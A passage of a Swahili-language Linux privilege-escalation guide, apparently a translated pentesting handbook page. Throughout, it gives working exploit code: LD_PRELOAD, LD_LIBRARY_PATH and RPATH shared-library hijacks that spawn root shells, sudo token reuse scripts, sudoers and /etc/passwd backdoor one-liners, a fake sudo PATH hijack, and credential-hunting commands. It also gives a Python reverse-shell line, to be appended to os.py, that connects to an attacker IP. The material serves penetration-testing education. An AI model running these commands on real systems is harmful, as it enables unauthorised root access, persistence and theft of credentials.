echo 'cp /bin/bash /var/tmp/rootbash; chmod 4755 /var/tmp/rootbash' >> /usr/local/bin/backup.sh
/usr/local/bin/backup_wrap
/var/tmp/rootbash -p
```
Ukaguzi wa haraka:
```bash
find / -perm -4000 -type f 2>/dev/null
strings /path/to/suid_wrapper | grep -E '/bin/bash|\\.sh'
ls -l /usr/local/bin/backup.sh
```
Njia hii ya shambulio ni ya kawaida hasa katika wrappers za "maintenance"/"backup" zinazosafirishwa katika `/usr/local/bin`.

### LD_PRELOAD & **LD_LIBRARY_PATH**

Kigezo cha mazingira **LD_PRELOAD** hutumiwa kubainisha shared libraries moja au zaidi (.so files) zitakazopakiwa na loader kabla ya zote nyingine, ikiwemo standard C library (`libc.so`). Mchakato huu unajulikana kama preloading ya library.

Hata hivyo, ili kudumisha usalama wa mfumo na kuzuia kipengele hiki kutumiwa vibaya, hasa kwa executables za **suid/sgid**, mfumo huweka masharti fulani:

- Loader hupuuza **LD_PRELOAD** kwa executables ambazo real user ID (_ruid_) haifanani na effective user ID (_euid_).
- Kwa executables zenye suid/sgid, ni libraries tu zilizo katika standard paths ambazo pia ni suid/sgid ndizo hupakiwa mapema.

Privilege escalation inaweza kutokea ikiwa una uwezo wa kuendesha amri kwa `sudo` na output ya `sudo -l` ina kauli **env_keep+=LD_PRELOAD**. Mipangilio hii huruhusu kigezo cha mazingira **LD_PRELOAD** kubaki na kutambuliwa hata wakati amri zinaendeshwa kwa `sudo`, jambo ambalo linaweza kusababisha utekelezaji wa code yoyote isiyoidhinishwa yenye privileges zilizoongezwa.
```
Defaults        env_keep += LD_PRELOAD
```
Hifadhi kama **/tmp/pe.c**
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Kisha **ikusanye** kwa kutumia:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Hatimaye, **ongeza haki** ukiendesha
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Privesc kama hiyo inaweza kutumiwa vibaya ikiwa mshambuliaji anadhibiti kigezo cha mazingira **LD_LIBRARY_PATH** kwa sababu anadhibiti njia ambako libraries zitatafutwa.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Wakati wa kukutana na binary yenye ruhusa za **SUID** inayoonekana isiyo ya kawaida, ni vyema kuthibitisha ikiwa inapakia faili za **.so** ipasavyo. Hii inaweza kukaguliwa kwa kuendesha amri ifuatayo:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Kwa mfano, kukutana na kosa kama _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ kunaonyesha uwezekano wa kutumiwa kwa shambulio.

Ili kutumia hili, mtu angeendelea kwa kuunda faili la C, kwa mfano _"/path/to/.config/libcalc.c"_, lenye msimbo ufuatao:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Msimbo huu, unapokompailiwa na kutekelezwa, unalenga kuinua ruhusa kwa kudhibiti ruhusa za faili na kuendesha shell yenye ruhusa zilizoinuliwa.

Kompaili faili la C hapo juu kuwa faili la shared object (.so) kwa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Hatimaye, kuendesha binary ya SUID iliyoathiriwa kunapaswa kuchochea exploit, na kuruhusu uwezekano wa kuathiri mfumo.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sasa kwa kuwa tumepata binary ya SUID inayopakia library kutoka kwenye folda ambayo tunaweza kuandika, tuunde library kwenye folda hiyo kwa jina linalohitajika:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ukikuta kosa kama vile
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
that means that the library you have generated need to have a function called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) ni orodha iliyochaguliwa ya Unix binaries ambazo zinaweza kutumiwa na mshambuliaji kupita vizuizi vya usalama vya ndani. [**GTFOArgs**](https://gtfoargs.github.io/) ni sawa lakini kwa hali ambapo unaweza **kuingiza tu arguments** kwenye command.

Project hii hukusanya functions halali za Unix binaries ambazo zinaweza kutumiwa vibaya ili kutoka kwenye restricted shells, kuongeza au kudumisha elevated privileges, kuhamisha files, kuanzisha bind na reverse shells, na kurahisisha tasks zingine za post-exploitation.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Kama unaweza kupata `sudo -l` unaweza kutumia tool [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) ili kuangalia kama inapata jinsi ya kutumia vibaya rule yoyote ya sudo.

### Reusing Sudo Tokens

Katika hali ambapo una **sudo access** lakini si password, unaweza kuongeza privileges kwa **kusubiri utekelezaji wa sudo command kisha kuiba session token**.

Requirements to escalate privileges:

- Tayari una shell kama user "_sampleuser_"
- "_sampleuser_" **ametumia `sudo`** kutekeleza kitu ndani ya **last 15mins** (kwa default hiyo ndiyo muda wa sudo token unaoruhusu kutumia `sudo` bila kuingiza password)
- `cat /proc/sys/kernel/yama/ptrace_scope` ni 0
- `gdb` inapatikana (unaweza kuipakia)

(Unaweza kuiwezesha kwa muda `ptrace_scope` kwa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` au kwa kubadili kwa kudumu `/etc/sysctl.d/10-ptrace.conf` na kuweka `kernel.yama.ptrace_scope = 0`)

Kama mahitaji haya yote yametimizwa, **unaweza kuongeza privileges ukitumia:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **exploit ya kwanza** (`exploit.sh`) itaunda binary `activate_sudo_token` katika _/tmp_. Unaweza kuitumia ili **kuamsha sudo token katika session yako** (hutapata root shell moja kwa moja, fanya `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- **Exploit ya pili** (`exploit_v2.sh`) itaunda shell ya `sh` katika _/tmp_ **inayomilikiwa na root yenye setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **exploit ya tatu** (`exploit_v3.sh`) itakuwa **inaunda faili la sudoers** ambalo linafanya **sudo tokens ziwe za milele na kuruhusu watumiaji wote kutumia sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Kama una **ruhusa za kuandika** katika folda au kwenye yoyote ya faili zilizoundwa ndani ya folda hiyo unaweza kutumia binary [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) ili **kuunda sudo token kwa mtumiaji na PID**.\
Kwa mfano, ikiwa unaweza kuandika juu ya faili _/var/run/sudo/ts/sampleuser_ na una shell kama mtumiaji huyo akiwa na PID 1234, unaweza **kupata sudo privileges** bila kuhitaji kujua nenosiri kwa kufanya:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Faili `/etc/sudoers` na faili zilizo ndani ya `/etc/sudoers.d` huweka usanidi wa nani anaweza kutumia `sudo` na jinsi gani. Faili hizi **kwa chaguo-msingi zinaweza kusomwa tu na user root na group root**.\
**Ikiwa** unaweza **kusoma** faili hii, unaweza **kupata taarifa fulani zenye manufaa**, na ikiwa unaweza **kuandika** faili yoyote, utaweza **kupanua privileges**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ikiwa unaweza kuandika, unaweza kutumia vibaya ruhusa hii
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Njia nyingine ya kutumia vibaya ruhusa hizi:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Kuna baadhi ya mbadala wa binary `sudo` kama vile `doas` kwa OpenBSD, kumbuka kuangalia usanidi wake katika `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ikiwa unajua kwamba **mtumiaji kwa kawaida huunganisha kwenye machine na kutumia `sudo`** ili kuongeza privileges na umefanikiwa kupata shell ndani ya context ya huyo mtumiaji, unaweza **kuunda executable mpya ya sudo** ambayo itatekeleza code yako kama root kisha amri ya mtumiaji. Kisha, **badilisha $PATH** ya user context (kwa mfano kuongeza path mpya kwenye .bash_profile) ili mtumiaji anapotekeleza sudo, executable yako ya sudo itekelezwe.

Kumbuka kwamba ikiwa mtumiaji anatumia shell tofauti (si bash) utahitaji kubadilisha files nyingine ili kuongeza path mpya. Kwa mfano[ sudo-piggyback](https://github.com/APTy/sudo-piggyback) hubadilisha `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Unaweza kupata mfano mwingine katika [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Au kuendesha kitu kama:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Faili `/etc/ld.so.conf` inaonyesha **ni wapi faili za usanidi zilizopakiwa zinapotoka**. Kawaida, faili hii ina njia ifuatayo: `include /etc/ld.so.conf.d/*.conf`

Hiyo inamaanisha kwamba faili za usanidi kutoka `/etc/ld.so.conf.d/*.conf` zitasomwa. Faili hizi za usanidi **zinaelekeza kwenye folda nyingine** ambapo **libraries** zitakuwa **zikitafutwa**. Kwa mfano, maudhui ya `/etc/ld.so.conf.d/libc.conf` ni `/usr/local/lib`. **Hii inamaanisha kuwa mfumo utatafuta libraries ndani ya `/usr/local/lib`**.

Ikiwa kwa sababu fulani **mtumiaji ana ruhusa za kuandika** kwenye mojawapo ya njia zilizoonyeshwa: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, faili yoyote ndani ya `/etc/ld.so.conf.d/` au folda yoyote ndani ya faili ya usanidi ndani ya `/etc/ld.so.conf.d/*.conf` anaweza kuweza kuongeza privileges.\
Angalia **jinsi ya ku-exploit this misconfiguration** katika ukurasa ufuatao:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kwa kunakili lib kwenda `/var/tmp/flag15/` itatumika na programu katika eneo hili kama ilivyobainishwa katika variable ya `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Kisha unda evil library katika `/var/tmp` kwa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities hutoa **subset ya ruhusa za root zinazopatikana kwa process**. Hii kwa ufanisi hugawanya root **privileges katika vitengo vidogo na tofauti**. Kila moja ya vitengo hivi basi inaweza kupewa processes kwa kujitegemea. Njia hii hupunguza seti kamili ya privileges, na hivyo kupunguza hatari za exploitation.\
Soma ukurasa ufuatao ili **kujifunza zaidi kuhusu capabilities na jinsi ya kuzielekeza vibaya**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

Katika directory, **bit ya "execute"** inaashiria kwamba user aliyeathiriwa anaweza "**cd**" ndani ya folder.\
**Bit ya "read"** inaashiria kwamba user anaweza **kuorodhesha** **files**, na **bit ya "write"** inaashiria kwamba user anaweza **kufuta** na **kuunda** **files** mpya.

## ACLs

Access Control Lists (ACLs) zinawakilisha layer ya pili ya permissions za discretionary, zenye uwezo wa **kuzidi traditional ugo/rwx permissions**. Ruhusa hizi huongeza udhibiti wa access ya file au directory kwa kuruhusu au kukataa rights kwa users mahususi ambao si owners au sehemu ya group. Kiwango hiki cha **granularity kinahakikisha usimamizi wa access ulio sahihi zaidi**. Maelezo zaidi yanaweza kupatikana [**hapa**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Give** user "kali" read and write permissions over a file:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Pata** files zilizo na ACLs mahususi kutoka kwenye system:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Backdoor ya ACL iliyofichwa kwenye sudoers drop-ins

Hitilafu ya kawaida ya usanidi ni faili inayomilikiwa na root katika `/etc/sudoers.d/` yenye mode `440` lakini bado inampa mtumiaji wa chini ruhusa ya kuandika kupitia ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ukipata kitu kama `user:alice:rw-`, mtumiaji anaweza kuongeza sheria ya sudo licha ya mode bits zenye vizuizi:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Hii ni njia ya persistence/privesc yenye athari kubwa ya ACL kwa sababu ni rahisi kuikosa kwenye mapitio ya `ls -l` pekee.

## Fungua shell sessions

Katika **matoleo ya zamani** unaweza **kuchukua udhibiti** wa baadhi ya **shell** session ya mtumiaji mwingine (**root**).\
Katika **matoleo mapya zaidi** utaweza **kuunganisha** kwenye screen sessions za mtumiaji wako mwenyewe tu. Hata hivyo, unaweza kupata **maelezo ya kuvutia** ndani ya session.

### screen sessions hijacking

**Orodhesha screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Ambatisha kwenye session**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## kuteka tmux sessions

Hii ilikuwa tatizo kwa **matoleo ya zamani ya tmux**. Sikuweza kuteka session ya tmux (v2.1) iliyoundwa na root kama mtumiaji asiye na ruhusa za juu.

**Orodhesha tmux sessions**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Ambatisha kwenye session**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

All SSL and SSH keys generated on Debian based systems (Ubuntu, Kubuntu, etc) between September 2006 and May 13th, 2008 may be affected by this bug.\
Bugu hii husababishwa wakati wa kuunda ssh key mpya katika OS hizo, kwa kuwa **ni mabadiliko 32,768 tu yalikuwa yanawezekana**. Hii ina maana kwamba chaguo zote zinaweza kukokotolewa na **ukiwa na ssh public key unaweza kutafuta private key inayolingana**. Unaweza kupata chaguo zilizokokotolewa hapa: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Hubainisha kama password authentication inaruhusiwa. Chaguo la msingi ni `no`.
- **PubkeyAuthentication:** Hubainisha kama public key authentication inaruhusiwa. Chaguo la msingi ni `yes`.
- **PermitEmptyPasswords**: Wakati password authentication inaruhusiwa, hubainisha kama server inaruhusu login kwa akaunti zilizo na empty password strings. Chaguo la msingi ni `no`.

### Login control files

Faili hizi huathiri ni nani anaweza login na kwa namna gani:

- **`/etc/nologin`**: ikiwa ipo, huzuia non-root logins na huonyesha ujumbe wake.
- **`/etc/securetty`**: huzuia root kuweza login wapi (TTY allowlist).
- **`/etc/motd`**: post-login banner (inaweza leak mazingira au maelezo ya maintenance).

### PermitRootLogin

Hubainisha kama root anaweza login kwa kutumia ssh, chaguo la msingi ni `no`. Thamani zinazowezekana ni:

- `yes`: root anaweza login kwa kutumia password na private key
- `without-password` or `prohibit-password`: root anaweza login tu kwa private key
- `forced-commands-only`: Root anaweza login tu kwa private key na kama commands options zimetajwa
- `no` : no

### AuthorizedKeysFile

Hubainisha faili zinazohifadhi public keys zinazoweza kutumika kwa user authentication. Inaweza kuwa na tokens kama `%h`, ambazo zitabadilishwa na home directory. **Unaweza kuonyesha absolute paths** (zinazoanza na `/`) au **relative paths kutoka home ya user**. Kwa mfano:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Configuration hiyo itaonyesha kwamba ukijaribu kuingia kwa kutumia ufunguo wa **private** wa mtumiaji "**testusername**" ssh italinganisha ufunguo wa public wa key yako na zile zilizo kwenye `/home/testusername/.ssh/authorized_keys` na `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding hukuruhusu **kutumia funguo zako za SSH za ndani badala ya kuacha funguo** (bila passphrases!) zikiwa kwenye server yako. Hivyo, utaweza **kuruka** kupitia ssh **kwenda kwenye host** na kutoka hapo **kuruka kwenda host nyingine** kwa **kutumia** **ufunguo** uliopo kwenye **host yako ya awali**.

Unahitaji kuweka chaguo hili katika `$HOME/.ssh.config` hivi:
```
Host example.com
ForwardAgent yes
```
Tambua kwamba ikiwa `Host` ni `*` kila wakati mtumiaji anaruka kwenda kwenye mashine tofauti, host hiyo itaweza kufikia keys (ambayo ni tatizo la usalama).

Faili `/etc/ssh_config` inaweza **kufuta** hii **options** na kuruhusu au kukataa usanidi huu.\
Faili `/etc/sshd_config` inaweza **kuruhusu** au **kukatali** ssh-agent forwarding kwa keyword `AllowAgentForwarding` (default ni allow).

Ikiwa utapata kwamba Forward Agent imewekwa katika mazingira, soma ukurasa ufuatao kwa kuwa **unaweza kuutumia vibaya ili kuongeza privileges**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Faili `/etc/profile` na faili zilizo chini ya `/etc/profile.d/` ni **scripts zinazotekelezwa wakati mtumiaji anaendesha shell mpya**. Kwa hiyo, ikiwa unaweza **kuandika au kurekebisha yoyote kati ya hizo unaweza kuongeza privileges**.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **maelezo nyeti**.

### Passwd/Shadow Files

Kulingana na OS, faili za `/etc/passwd` na `/etc/shadow` zinaweza kuwa zinatumia jina tofauti au huenda kuna backup. Kwa hiyo inapendekezwa **tafuta zote** na **kagua kama unaweza kuzisoma** ili kuona **kama kuna hashes** ndani ya faili:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Wakati mwingine unaweza kupata **password hashes** ndani ya faili ya `/etc/passwd` (au inayolingana)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### `/etc/passwd` inayoweza kuandikwa

Kwanza, tengeneza password kwa kutumia mojawapo ya amri zifuatazo.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Kisha ongeza mtumiaji `hacker` na ongeza nenosiri lililotengenezwa.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Kwa mfano: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sasa unaweza kutumia amri ya `su` na `hacker:hacker`

Vinginevyo, unaweza kutumia mistari ifuatayo ili kuongeza mtumiaji wa uongo bila nenosiri.\
WARNING: unaweza kudhoofisha usalama wa sasa wa mashine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
KUMBUKA: Katika majukwaa ya BSD `/etc/passwd` iko katika `/etc/pwd.db` na `/etc/master.passwd`, pia `/etc/shadow` imepewa jina jipya kuwa `/etc/spwd.db`.

Unapaswa kuangalia kama unaweza **kuandika kwenye baadhi ya faili nyeti**. Kwa mfano, je, unaweza kuandika kwenye faili fulani ya **usanidi wa huduma**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Kwa mfano, ikiwa mashine inaendesha seva ya **tomcat** na unaweza **kurekebisha faili ya usanidi wa huduma ya Tomcat ndani ya /etc/systemd/,** basi unaweza kurekebisha mistari:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Backdoor yako itatekelezwa mara inayofuata tomcat itakapoanzishwa.

### Angalia Folders

Folders zifuatazo zinaweza kuwa na backups au taarifa za kuvutia: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Huenda hutaweza kusoma ya mwisho lakini jaribu)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Mahali Isiyo ya Kawaida/Mafaili yanayomilikiwa
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Faili zilizobadilishwa katika dakika za mwisho
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Faili za Sqlite DB
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_historia, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml files
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Faili fiche
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries katika PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Faili za Web**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Hifadhi nakala**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Faili zinazojulikana kuwa na nywila

Soma code ya [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), inatafuta **faili kadhaa zinazowezekana ambazo zinaweza kuwa na nywila**.\
**Kifaa kingine cha kuvutia** ambacho unaweza kutumia kufanya hivyo ni: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) ambacho ni application ya open source inayotumika kupata nywila nyingi zilizohifadhiwa kwenye kompyuta ya local kwa Windows, Linux & Mac.

### Logs

Ikiwa unaweza kusoma logs, unaweza kupata **maelezo ya kuvutia/siri ndani yake**. Kadiri log inavyokuwa ya ajabu zaidi, ndivyo itakavyokuwa ya kuvutia zaidi (huenda).\
Pia, baadhi ya **audit logs** zilizosanidiwa vibaya ("bad" configured) (backdoored?) zinaweza kukuruhusu **kuandika nywila** ndani ya audit logs kama ilivyoelezwa katika post hii: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Ili **kusoma logs, group** [**adm**](interesting-groups-linux-pe/index.html#adm-group) itakuwa muhimu sana.

### Shell files
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Unapaswa pia kuangalia faili zenye neno "**password**" katika **jina** lake au ndani ya **content**, na pia kuangalia IPs na emails ndani ya logs, au hashes regexps.\
Sitaorodhesha hapa jinsi ya kufanya yote haya lakini kama una nia unaweza kuangalia checks za mwisho ambazo [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh) hufanya.

## Writable files

### Python library hijacking

Ukijua script ya **python** itatekelezwa **kutoka wapi** na **unaweza kuandika ndani** ya folder hiyo au unaweza **kubadili python libraries**, unaweza kubadili OS library na kui-backdoor (kama unaweza kuandika mahali ambapo python script itatekelezwa, nakili na bandika library ya os.py).

Ili **ku-backdoor library** ongeza tu mwishoni mwa library ya os.py line ifuatayo (badilisha IP na PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Udhaifu katika `logrotate` huruhusu watumiaji wenye **ruhusa za kuandika** kwenye faili ya log au kwenye directory zake za mzazi huenda wapate privileges zilizoongezwa. Hii ni kwa sababu `logrotate`, mara nyingi ikiendeshwa kama **root**, inaweza kudanganywa ili kutekeleza faili zozote, hasa kwenye directories kama _**/etc/bash_completion.d/**_. Ni muhimu kuangalia permissions si tu ndani ya _/var/log_ bali pia ndani ya directory yoyote ambako log rotation inatumika.

> [!TIP]
> Udhaifu huu unaathiri toleo la `logrotate` `3.18.0` na la zamani zaidi

Taarifa zaidi kuhusu udhaifu huu zinaweza kupatikana kwenye ukurasa huu: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Unaweza kutumia udhaifu huu kwa [**logrotten**](https://github.com/whotwagner/logrotten).

